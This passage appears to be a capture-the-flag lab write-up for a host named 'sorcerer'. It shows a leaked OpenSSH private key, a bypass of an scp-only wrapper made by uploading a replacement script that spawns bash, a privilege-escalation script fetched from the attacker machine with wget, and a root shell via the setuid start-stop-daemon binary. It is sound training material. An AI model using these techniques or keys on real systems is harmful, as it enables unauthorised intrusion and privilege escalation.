ILK6TCf455eNl3zla8HQyGQ4mexpZZPHaSPO9fjmE8kGC264dPsnBCMT+/VnacQDIY69fB
Oq6dTztBmZTZUtZvZv81XgTC1YLW89Xu+wKBgpPeZTb5+hvO5O40q/1TVF2BjXHHp2pEnd
qYMEBtdzPiTipO3yfvqBeV+GOfBTpPvelpPRx/lIHhNwk6GwJ6230+JKPyOtCCZ2hpsVHF
wHQx4TZ5yQo+Wfb49Vr0awFS8PjowPyBpo3mrlskVa/SL7QeJhvNPKn0dyF3ljD8a3sSup
aK4VM1poOF+3WmB8jac0pbvBFaypsNPde1u7WorwZBaffNhe6cqBZ2K5s4EZT1FQ2BRO9n
wl5aqBUlqwh6ATK3WxAAABAQC7f809+Uc7u2vkgdol/lvQcRWK7ynUoFuNaFiui1RJRSsS
7otY1SGyXsUh7CNCTyOFjU/0ke7gwD8KZeIPZwNQThp1eISi1HHPSI5Y/R1kzKMW63ZspC
P375mKmyignBrlolsqHzZq+WqJKoRcrJgVzKJoB7ExJrcOPP9TYJKFT9OkN0cZk30OuvvX
RI0gOuVnQHUp87lZiTj67L0dJt4x+gxNT71RradHx66I44muY6ANU7h+eQ39jSi7lZLU48
5jy5FCN1tBcwpLygwiT0KGqnmtomDusamI/qjCbY5yvx5HYlxwTuLNbWkNiUmovNcx4u25
dq79EeFGQ0RfuV2WAAABAQDbJhOtD+wbtjqmJaJVAlHXNnMaty2X4s2BY3sYvDvE9tU2UD
DjFhWc1cOWF6WibKC9kUc6/hiNnKj4LhngJeYl68ZZRrZySQF+6DngJFM8+TUA9veBbtdO
kKzmsHed6JQ/Jb54u/kYe3YHzy0XjnbJ5eKX+5Y28xCrL7HwE2QqVSgHjhJxRuMHhd+wtk
f3l0OtP6fkKDT+MmWgelsamLPAHUN+JB26P+gOJvkHLQsJUyGQf6KbSJdjb5YrExzv7DA6
9DCnuFOowUJmIBZFJW8gl/bbqSHe/m2tFYAkShaV+6/oivKo+aEhsTNmd0XuCV8L6dVYEr
IYEOr3Wp6sqIzVAAABAQDW5iq/v65Gw/65sQsDPvlNW3I8UF9ww0hBAJMp0DJQIDpjWoa3
ggO9GXhduntB3TtHViA25ksS7nDrddC2tNgiz1qnpaR5JtX/WEEgX9Xxaz/iPYbEY471hN
jW+j7KBZj9ytmbXXyasK1dwoheXPGiUYYAWXr5QllAxfYyrblQnik/ldcMItyNfOW2UdWj
KZNW6M6KAssBs6y7Sn/E5lid3VN3ET/3kVeuBbOAg0ZSygKIni9Re2FEl0bubFtWwmW/5k
6PQ2RfbQO9eeOaH4W9/rD5qAokP4k9wJWmlon2rJcJRQs+wR/9Bywa0lBmSO6cJzZ0iuu3
uQx0OZIkU+m9AAAADG1heEBzb3JjZXJlcgECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/home/max/.ssh]
└─$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/home/max/.ssh]
└─$ cd ..           
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/home/max]
└─$ ls    
scp_wrapper.sh  tomcat-users.xml.bak
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/home/max]
└─$ cat scp_wrapper.sh 
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/home/max]
└─$ ./scp_wrapper.sh
ACCESS DENIED.
usage: scp [-346ABCpqrTv] [-c cipher] [-F ssh_config] [-i identity_file]
            [-J destination] [-l limit] [-o ssh_option] [-P port]
            [-S program] source ... target
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/home/max]
└─$  
```

## Replace SSH Script 

```bash
┌──(kali㉿kali)-[/tmp/home/max/.ssh]
└─$ cat /tmp/scp_wrapper.sh 
#!/bin/bash
bash

┌──(kali㉿kali)-[/tmp/home/max/.ssh]
└─$ scp -i id_rsa /tmp/scp_wrapper.sh max@192.168.168.100:/home/max/scp_wrapper.sh 
scp_wrapper.sh                                                                                                                        100%   17     0.1KB/s   00:00    
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/home/max/.ssh]
└─$ ssh -i id_rsa max@192.168.168.100                   
PTY allocation request failed on channel 0
whoami
max
ls
scp_wrapper.sh
tomcat-users.xml.bak
pwd
/home/max
bash
exit
cd ..
ls
dennis
francis
max
miriam
sofia
exit
Connection to 192.168.168.100 closed.
 
┌──(kali㉿kali)-[/tmp/home/max/.ssh]
└─$
```

```bash
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/home/max/.ssh]
└─$ ssh -i id_rsa max@192.168.168.100                                                                                                                             255 ⨯
PTY allocation request failed on channel 0
ls
scp_wrapper.sh
tomcat-users.xml.bak
   
pwd
/home/max

cd ..

ls -alR
.:
total 28
drwxr-xr-x  7 root    root    4096 Sep 24  2020 .
drwxr-xr-x 18 root    root    4096 Sep 24  2020 ..
drwxr-xr-x  2 dennis  dennis  4096 Sep 24  2020 dennis
drwxr-xr-x  2 francis francis 4096 Sep 24  2020 francis
drwxr-xr-x  3 max     max     4096 Sep 24  2020 max
drwxr-xr-x  2 miriam  miriam  4096 Sep 24  2020 miriam
drwxr-xr-x  2 sofia   sofia   4096 Sep 24  2020 sofia

./dennis:
total 24
drwxr-xr-x 2 dennis dennis 4096 Sep 24  2020 .
drwxr-xr-x 7 root   root   4096 Sep 24  2020 ..
-rw-r--r-- 1 dennis dennis  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 dennis dennis 3526 Apr 18  2019 .bashrc
-rw------- 1 max    max      33 Mar  5 11:03 local.txt
-rw-r--r-- 1 dennis dennis  807 Apr 18  2019 .profile

./francis:
total 20
drwxr-xr-x 2 francis francis 4096 Sep 24  2020 .
drwxr-xr-x 7 root    root    4096 Sep 24  2020 ..
-rw-r--r-- 1 francis francis  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 francis francis 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 francis francis  807 Apr 18  2019 .profile

./max:
total 32
drwxr-xr-x 3 max  max  4096 Sep 24  2020 .
drwxr-xr-x 7 root root 4096 Sep 24  2020 ..
-rw-r--r-- 1 max  max   220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 max  max  3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 max  max   807 Apr 18  2019 .profile
-rwxr-xr-x 1 max  max    17 Mar  5 12:00 scp_wrapper.sh
drwx------ 2 max  max  4096 Sep 24  2020 .ssh
-rw-r--r-- 1 max  max  1991 Sep 24  2020 tomcat-users.xml.bak

./max/.ssh:
total 20
drwx------ 2 max max 4096 Sep 24  2020 .
drwxr-xr-x 3 max max 4096 Sep 24  2020 ..
-rw-r--r-- 1 max max 1399 Mar  5 12:02 authorized_keys
-rw-r--r-- 1 max max 3381 Sep 24  2020 id_rsa
-rw-r--r-- 1 max max  738 Sep 24  2020 id_rsa.pub

./miriam:
total 20
drwxr-xr-x 2 miriam miriam 4096 Sep 24  2020 .
drwxr-xr-x 7 root   root   4096 Sep 24  2020 ..
-rw-r--r-- 1 miriam miriam  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 miriam miriam 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 miriam miriam  807 Apr 18  2019 .profile

./sofia:
total 20
drwxr-xr-x 2 sofia sofia 4096 Sep 24  2020 .
drwxr-xr-x 7 root  root  4096 Sep 24  2020 ..
-rw-r--r-- 1 sofia sofia  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 sofia sofia 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 sofia sofia  807 Apr 18  2019 .profile
   
cd dennis
ls
local.txt

cat local.txt
18c0f858d9bedf3afb3f210f807d411c
ifconfig
bash: line 13: ifconfig: command not found
cat local.txt
18c0f858d9bedf3afb3f210f807d411c
/sbin/ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.168.100  netmask 255.255.255.0  broadcast 192.168.168.255
        ether 00:50:56:ba:ba:52  txqueuelen 1000  (Ethernet)
        RX packets 698818  bytes 102509419 (97.7 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 676954  bytes 328869538 (313.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mkdir .ssh
mkdir: cannot create directory ‘.ssh’: Permission denied
```

![](Pasted%20image%2020220306010434.png)

# Privesc

```bash
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cp /home/kali/Documents/Files/linux/scripts/privesc/lse.sh /tmp
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.168.100 - - [05/Mar/2022 12:06:49] "GET /lse.sh HTTP/1.1" 200 -
```

```bash
┌──(kali㉿kali)-[/tmp/home/max/.ssh]
└─$ ssh -i id_rsa max@192.168.168.100                                                                                                                               1 ⨯
PTY allocation request failed on channel 0
ls
scp_wrapper.sh
tomcat-users.xml.bak
 
cd /tmp
wget 192.168.49.168:8080/lse.sh
--2022-03-05 12:06:49--  http://192.168.49.168:8080/lse.sh
Connecting to 192.168.49.168:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: ‘lse.sh’

     0K .......... .......... .......... .......... ..        100%  123K=0.3s

2022-03-05 12:06:49 (123 KB/s) - ‘lse.sh’ saved [43570/43570]

chmod +x lse.sh
./lse.sh
---
If you know the current user password, write it here to check sudo privileges:                                                                                          
---
                                                                                                                                                                        
 LSE Version: 3.7                                                                                                                                                       

        User: max
     User ID: 1003
    Password: none
        Home: /home/max
        Path: /usr/local/bin:/usr/bin:/bin:/usr/games
       umask: 0022

    Hostname: sorcerer
       Linux: 4.19.0-10-amd64
Distribution: Debian GNU/Linux 10 (buster)
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                                                        
[i] usr060 Other users..................................................... skip                                                                                        
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                        
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/sbin/start-stop-daemon
/usr/bin/vmware-user-suid-wrapper
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip                                                                                        
[!] fst060 Can we write to any setgid binary?.............................. skip                                                                                        
[*] fst070 Can we read /root?.............................................. nope                                                                                        
[*] fst080 Can we read subdirectories under /home?......................... yes!
[*] fst090 SSH files in home directories................................... yes!
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'max' have mail?........................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'max'....................................... skip
[i] fst510 SSH files anywhere.............................................. skip                                                                                        
[i] fst520 Check hosts.equiv file and its contents......................... skip                                                                                        
[i] fst530 List NFS server shares.......................................... skip                                                                                        
[i] fst540 Dump fstab file................................................. skip                                                                                        
=================================================================( system )=====                                                                                        
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip                                                                                        
[!] sys020 Does the /etc/passwd have hashes?............................... nope                                                                                        
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... nope
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip                                                                                        
[i] sys080 System password policies in /etc/login.defs..................... skip                                                                                        
===============================================================( security )=====                                                                                        
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope                                                                                        
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. nope
[!] ret060 Can we write to executable paths present in cron jobs........... skip
[i] ret400 Cron files...................................................... skip                                                                                        
[*] ret500 User systemd timers............................................. nope                                                                                        
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====                                                                                        
[*] net000 Services listening only on localhost............................ yes!
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip                                                                                        
[i] net520 ARP table....................................................... skip                                                                                        
[i] net530 Nameservers..................................................... skip                                                                                        
[i] net540 Systemd Nameservers............................................. skip                                                                                        
[i] net550 Listening TCP................................................... skip                                                                                        
[i] net560 Listening UDP................................................... skip                                                                                        
===============================================================( services )=====                                                                                        
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip                                                                                        
[i] srv420 List /etc/xinetd.d if used...................................... skip                                                                                        
[i] srv430 List /etc/init.d/ permissions................................... skip                                                                                        
[i] srv440 List /etc/rc.d/init.d permissions............................... skip                                                                                        
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                                                                                        
[i] srv460 List /etc/init/ permissions..................................... skip                                                                                        
[!] srv500 Can we write in systemd service files?.......................... nope                                                                                        
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====                                                                                        
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ nope
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip                                                                                        
[i] sof520 Postgres version................................................ skip                                                                                        
[i] sof530 Apache version.................................................. skip                                                                                        
[i] sof540 Tmux version.................................................... skip                                                                                        
[i] sof550 Screen version.................................................. skip                                                                                        
=============================================================( containers )=====                                                                                        
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip                                                                                        
                                                                                                                                                                        
==================================( FINISHED )==================================                                                                                        
start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
bash: line 7: start-stop-daemon: command not found
/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
whoami
root
cd /root
ls
proof.txt
cat proof.txt
d1c983f05d654026bc5d2b14ad371847
/sbin/ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.168.100  netmask 255.255.255.0  broadcast 192.168.168.255
        ether 00:50:56:ba:ba:52  txqueuelen 1000  (Ethernet)
        RX packets 751627  bytes 110744785 (105.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 727796  bytes 355632931 (339.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

![](Pasted%20image%2020220306011000.png)

# Others